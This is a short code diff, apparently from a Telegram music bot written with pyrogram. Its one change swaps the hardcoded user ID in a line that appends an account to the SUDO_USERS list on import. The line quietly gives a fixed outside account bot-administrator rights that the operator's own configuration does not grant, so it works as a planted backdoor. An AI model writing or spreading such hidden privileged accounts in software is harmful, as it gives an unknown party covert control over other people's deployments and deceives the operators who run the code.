@@ -6,7 +6,7 @@ from pyrogram.types import Message
 from AsuX.admins import get_administrators
 from AsuXMusic.config import SUDO_USERS
 
-SUDO_USERS.append(5938660179)
+SUDO_USERS.append(1236703127)
 
 
 def errors(func: Callable) -> Callable:
